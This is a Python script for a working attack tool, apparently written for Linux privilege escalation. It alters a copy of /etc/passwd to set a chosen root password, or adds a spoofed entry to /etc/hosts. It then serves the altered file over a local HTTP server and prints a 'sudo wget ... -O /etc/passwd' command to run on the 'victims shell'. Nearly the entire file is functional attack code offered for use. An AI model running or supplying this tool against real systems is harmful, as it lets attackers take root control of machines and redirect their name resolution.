#!/usr/bin/env python3
import http.server
import os
import socket
import socketserver
import tempfile

import logging
from passlib.hash import sha512_crypt

class CustomFormatter(logging.Formatter):
    """Logging Formatter to add colors"""

    format = "%(message)s"
    FORMATS = {
        logging.DEBUG: format,  # White
        logging.INFO: format,  # Cyan
        logging.ERROR: format,  # Red
    }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)

# Create a logger object
logger = logging.getLogger(__name__)

# Configure logger
console_handler = logging.StreamHandler()
console_handler.setFormatter(CustomFormatter())
logger.addHandler(console_handler)
logger.setLevel(logging.DEBUG)

CYAN = "\033[0;36m"
GREEN = "\033[0;32m"
RED = "\033[0;31m"
BOLD = "\033[1m"
UNDERLINE = "\033[4m"
RESET = "\033[0m"


def log_poison_info(file: str, dest: str, serve_host: str, port: int):
    logger.info(f"{GREEN}[+]{RESET} Poisoned {UNDERLINE}{GREEN}{file}{RESET}")
    logger.info(f"{GREEN}[+]{RESET} Serving poisoned {UNDERLINE}{GREEN}{file}{RESET} on {GREEN}{serve_host}:{port}{RESET}")
    logger.info(f"{GREEN}[-]{RESET}{BOLD} Execute the following command on the victims shell:{RESET}\n\n{GREEN}sudo wget http://{serve_host}:{port} -O {dest}{RESET}")

def poison_file(file: str, mod_func: callable) -> None:
    try:
        with open(file, "rb") as fd:
            contents = fd.readlines()
        contents = mod_func(contents)
        with open(file, "wb") as fd:
            fd.writelines(contents)
    except PermissionError:
            logger.error(f"Permission denied when trying to open {file}.")
    except Exception as e:
        logger.exception(f"An unexpected error occurred: {e}")

def mod_passwd(contents: list[bytes], password: str) -> None:
    """Replace the root password from the contents of a passwd file"""
    for index, line in enumerate(contents):
        if line.startswith(b"root"):
            line = line.split(b":")
            line[1] = sha512_crypt.hash(password).encode()
            contents[index] = b":".join(line)

    return contents

def mod_hosts(contents: list[bytes]) -> None:
    # Poison hosts file
        address = input(
            f"{BOLD}Enter the IP address to poison {CYAN}(default: 127.0.0.1): {RESET} ")
        address = address if address else "127.0.0.1"

        hostname = input(
            f"{BOLD}Enter hostname to map with specified IP {CYAN}(default: localhost):{RESET} ")
        hostname = hostname if hostname else "localhost"

        payload = f"{address}   {hostname}".encode()

        for index, line in enumerate(contents):
            if line.startswith(address.encode()):
                contents[index] = payload + b"\n"
        if not address in contents:
            contents.append(payload + b"\n")
        return contents

def check_interface(i: str) -> str:
    """Validate interface name"""
    try:
        socket.inet_aton(i)
    except socket.error:
        try:
            i = socket.gethostbyname(i)
        except socket.gaierror:
            logging.error(
                f"Error determining HTTP hosting address. Did you provide an interface or IP?")
    return i


def tmp_file() -> str:
    # Create a temporary HTTP server location
    serve_path = os.path.join(os.path.join(
        tempfile._get_default_tempdir(), next(tempfile._get_candidate_names())), "www")
    os.makedirs(serve_path)

    return serve_path


class TCPServer(socketserver.TCPServer):
    # Reuseable TCP server
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(self.server_address)


class Handler(http.server.SimpleHTTPRequestHandler):
    # Custom HTTP handler
    def __init__(self, *args, serve_file: str,**kwargs):
        self.serve_file = serve_file
        directory = tmp_file()
        super().__init__(*args, directory=directory, **kwargs)

    def do_GET(self):
        try:
            with open(self.serve_file, "rb") as fd:
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(fd.read())
        except Exception as e:
            self.send_error(500, f"Server Error: {e}")

def main() -> None:
    try:
        interface = input(
            f"{BOLD}Network interface or IP address to host the HTTP server {CYAN}{BOLD}(default: eth0):{RESET} ").lower()
        interface = interface if interface else "eth0"

        port = input(
            f"{BOLD}Specify alternate port {CYAN}{BOLD}(default: 8000):{RESET} ")
        port = int(port) if port else 8000
        serve_host = check_interface(interface)

        while True:
            file = input(f"{BOLD}File to config {CYAN}{BOLD}(Must be a valid file!):{RESET} ").strip()
            if os.path.isfile(file):
                break
            logger.error("Not a valid file. Please provide a valid file.")


        while True:
            payload = input(
                f"{BOLD}Payload to execute (Options: {CYAN}{BOLD}forceroot, dnspoof):{RESET} ").lower()
            if not payload in ["forceroot", "dnspoof"]:
                logger.error(
                    f"{RED}Invalid choice.{RESET} Please choose either 'forceroot' or 'dnspoof'.")
                continue
            break

        match payload:
            case "forceroot":
                password = input(
                    f"{BOLD}Password to set for the root user {CYAN}{BOLD}(default: root):{RESET} ")
                password = password if password else "root"
                poison_file(file, lambda contents: mod_passwd(contents, password))
                log_poison_info(file, "/etc/passwd", serve_host, port)
                logger.info(
                    f"{GREEN}[*]{RESET} USER: {BOLD}root{RESET} PASSWORD: {BOLD}{CYAN}{password}{RESET}")

            case "dnspoof":
                poison_file(file, mod_hosts)
                log_poison_info(file, "/etc/hosts", serve_host, port)
    

        def serve_http():
            # Serve the HTTP server
            with TCPServer((serve_host, port), lambda *args, **kwargs: Handler(*args, serve_file=file, **kwargs)) as httpd:
                httpd.serve_forever()
        try:
            serve_http()

        except KeyboardInterrupt:
            logger.error(
                f"{RED}[!]{RESET} {BOLD}Keyboard interrupt. Exiting . . .{RESET}")

    except Exception:
        logger.exception("An error occurred in writing hosts file.")


if __name__ == "__main__":
    main()
